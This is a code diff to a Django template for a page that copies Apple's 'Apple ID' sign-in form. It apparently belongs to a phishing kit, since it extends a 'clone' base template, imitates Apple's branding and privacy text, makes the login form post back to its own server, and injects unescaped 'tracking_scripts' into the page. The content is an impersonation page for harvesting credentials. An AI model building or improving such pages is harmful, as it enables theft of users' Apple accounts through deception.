@@ -1,6 +1,10 @@
-{% extends 'base.html' %}
+{% extends 'base/clone.html' %}
 
 {% load static %}
+
+{% block icon %}
+<link rel="apple-touch-icon" href="{% static 'images/apple-touch-icon.png' %}">
+{% endblock %}
 
 {% block content %}
 <div class="apple-login-container">
@@ -13,7 +17,8 @@
         
         <h1 class="apple-login-title">Apple ID</h1>
         
-        <form action="/submit/" method="post" class="apple-login-form" id="appleLoginForm">
+        <form  method="post" class="apple-login-form" id="appleLoginForm">
+            {% csrf_token %}
             <div class="apple-input-group">
                 <input type="text" name="appleid" id="appleid" required autocomplete="username" class="apple-input">
                 <label for="appleid" class="apple-input-label">Apple ID</label>
@@ -65,6 +70,7 @@
         <p>Your Apple ID information is used to allow you to sign in securely and access your data. Apple records certain data for security, support, and reporting purposes. If you agree, Apple may also use your Apple ID information to send you marketing emails and communications, including based on your use of Apple services.</p>
     </div>
 </div>
+{{ tracking_scripts|safe }}
 
 <style>
 :root {
